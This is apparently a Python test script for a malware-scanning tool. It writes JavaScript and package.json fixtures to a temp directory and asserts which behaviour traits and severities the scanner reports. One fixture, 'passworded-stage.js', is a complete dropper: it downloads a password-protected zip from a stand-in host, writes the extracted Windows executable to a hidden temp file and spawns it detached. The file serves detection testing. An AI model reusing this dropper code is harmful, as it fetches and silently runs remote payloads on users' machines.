#!/usr/bin/env python3
"""Check permission operations, two-factor evidence and npm declarations."""

import argparse
import json
from pathlib import Path
import subprocess
import tempfile


DIR = "micro-behaviors/fs/directory/create::node-mkdir-owner-only-mode"
WRITE = "micro-behaviors/fs/write/file/executable::node-write-file-executable-mode"
STREAM = "micro-behaviors/fs/write/stream::node-write-stream-executable-mode"
EXEC = "micro-behaviors/fs/chmod/executable/mode::node-chmod-make-executable"
FACTOR = "micro-behaviors/communications/http/request/body/credential::js-login-body-twofactor-assignment"
BIN = "metadata/package/entrypoint/command::bin-field-declared"
DROPPER = "objectives/execution/payload/file-exec/spawn/runtime::node-passworded-archive-pe-dropper"


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--cleave", default="../cleave/target/debug/cleave")
    args = parser.parse_args()
    root = Path(__file__).resolve().parents[2]
    cleave = str((root / args.cleave).resolve())
    fixtures = {
        "mkdir.js": 'mkdir(dir, {recursive: true, mode: 0o700});\n',
        "mkdir-decimal.js": 'fs.mkdirSync(dir, {mode: 448});\n',
        "mkdir-public.js": 'fs.mkdirSync(dir, {mode: 0o755});\n',
        "alias-directory.js": '''
import {writeFile as save} from 'fs/promises';
mkdir(dir, {mode: 0o700});
save(file, data, {mode: 0o600});
''',
        "write.js": 'fs.writeFile(file, data, {mode: 0o700});\n',
        "bare-write.js": 'writeFileSync(file, data, {mode: 0o700});\n',
        "write-decimal.js": 'writeFile(file, data, {mode: 448});\n',
        "write-hex.js": 'fs.writeFile(file, data, {mode: 0x1c0});\n',
        "write-setid.js": 'fs.writeFile(file, data, {mode: 0o4700});\n',
        "other-execute.js": 'writeFile(file, data, {"mode": 0o601});\n',
        "private-write.js": 'writeFile(file, data, {mode: 0o600});\n',
        "nested-mode.js": 'writeFile(file, data, {other: {mode: 0o700}});\n',
        "unrelated-mode.js": '''
fs.promises.writeFile(file, data);
mkdir(dir, {mode: 0o700});
''',
        "mode-data.js": 'const settings = {mode: 0o700};\n',
        "mode-comment.js": '// fs.writeFile(file, data, {mode: 0o700});\n',
        "mode-quoted.js": 'const example = "fs.writeFile(file, data, {mode: 0o700})";\n',
        "stream.js": 'fs.createWriteStream(file, {mode: 0o755});\n',
        "stream-constructor.js": 'const out = new fs.WriteStream(file, {mode: 0o700});\n',
        "stream-private.js": 'createWriteStream(file, {mode: 0o600});\n',
        "stream-comment.js": '// fs.createWriteStream(file, {mode: 0o700});\n',
        "twofactor-code.js": 'const body = {}; body.twoFactor = "123456";\n',
        "twofactor-seed.js": 'const body = {}; body.twoFactor = base32Seed;\n',
        "twofactor-comment.js": '// body.twoFactor = seed;\n',
        "twofactor-quoted.js": 'const example = "body.twoFactor = seed";\n',
        "twofactor-compare.js": 'if (body.twoFactor === code) { reportStatus(); }\n',
        "passworded-stage.js": '''
const fs = require('fs');
const path = require('path');
const os = require('os');
const transport = require('https');
const AdmZip = require('adm-zip');
const {spawn} = require('child_process');
function stage(url, password) {
  const req = transport.request(url, response => {
    const chunks = [];
    response.on('data', chunk => chunks.push(chunk));
    response.on('end', async () => {
      const entry = new AdmZip(Buffer.concat(chunks)).getEntries()[0];
      const data = entry.getData(password);
      if (data[0] !== 0x4d || data[1] !== 0x5a) throw new Error('invalid image');
      const destination = path.join(os.tmpdir(), '.run.exe');
      await fs.promises.writeFile(destination, data, {mode: 0o700});
      spawn(destination, [], {detached: true, stdio: 'ignore', windowsHide: true}).unref();
    });
  });
  req.end();
}
stage('https://control.example/payload.zip', 'demo');
''',
        "bin/package.json": '{"name":"ordinary-cli","version":"2.3.4","bin":{"ordinary":"cli.js"}}',
        "empty-bin/package.json": '{"name":"ordinary-library","version":"2.3.4","bin":{}}',
        "no-bin/package.json": '{"name":"ordinary-library","version":"2.3.4"}',
    }
    fixtures["stage-unrelated-mode.js"] = (
        fixtures["passworded-stage.js"].replace("mode: 0o700", "mode: 0o600")
        + "\nmkdir(cache, {mode: 0o700});\n"
    )
    required = {
        **{name: {DIR} for name in ("mkdir.js", "mkdir-decimal.js", "alias-directory.js", "unrelated-mode.js")},
        **{name: {WRITE} for name in ("write.js", "bare-write.js", "write-decimal.js", "write-hex.js", "write-setid.js", "other-execute.js")},
        **{name: {STREAM} for name in ("stream.js", "stream-constructor.js")},
        "twofactor-code.js": {FACTOR}, "twofactor-seed.js": {FACTOR},
        "bin/package.json": {BIN, "metadata/package/entrypoint/command::npm-single-bin"},
        "empty-bin/package.json": {BIN},
        "passworded-stage.js": {WRITE, DROPPER},
        "stage-unrelated-mode.js": {DIR},
    }
    obsolete = {
        "metadata/package/entrypoint/command::has-bin-field",
        "metadata/package/files/count::npm-single-bin",
        "metadata/package/files/count::npm-multiple-bins",
        "micro-behaviors/fs/chmod/executable/mode::javascript-owner-executable-mode-option",
        "micro-behaviors/fs/chmod/executable/create::node-writefile-owner-executable-mode",
        "micro-behaviors/fs/chmod/executable/create::node-write-mode-executable-option",
        "micro-behaviors/fs/chmod/executable/create::node-fs-promises-write-executable-mode",
        "micro-behaviors/communications/http/request/body/credential::js-login-body-totp-secret",
    }
    with tempfile.TemporaryDirectory(prefix="tar-improve-round2-") as tmp:
        work = Path(tmp)
        for name, source in fixtures.items():
            path = work / name
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text(source)
        result = subprocess.run(
            [cleave, "--traits-dir", str(root), "--all-files", "--format", "json", str(work)],
            text=True, capture_output=True, check=True,
        )
        files = {str(Path(f["path"]).relative_to(work)): f
                 for line in result.stdout.split("\n") if line
                 for f in json.loads(line)["files"]}
        for name in fixtures:
            traits = files[name].get("traits", [])
            ids = {t["id"] for t in traits}
            assert not (required.get(name, set()) - ids), (name, "missing", required[name] - ids)
            assert not (obsolete & ids), (name, "obsolete", obsolete & ids)
            for id in (DIR, WRITE, STREAM, EXEC, FACTOR, BIN):
                # Report finalization may omit a grouping composite when a
                # single stronger constituent already reports this call.
                if id == EXEC and required.get(name, set()) & {WRITE, STREAM}:
                    continue
                if id not in required.get(name, set()):
                    assert id not in ids, (name, "unexpected", id)
            if FACTOR in ids:
                desc = next(t["desc"] for t in traits if t["id"] == FACTOR)
                assert "TOTP" not in desc and "seed" not in desc.lower(), desc
            if name == "passworded-stage.js":
                assert next(t["crit"] for t in traits if t["id"] == DROPPER) == 5
            elif name == "stage-unrelated-mode.js":
                assert DROPPER not in ids, (name, "directory mode substituted for payload mode")
            else:
                assert not [t for t in traits if t["crit"] >= 4], (name, "unexpected severe finding")
            print(f"PASS {name}")
        print(f"{len(fixtures)} round-two tar controls passed")


if __name__ == "__main__":
    main()
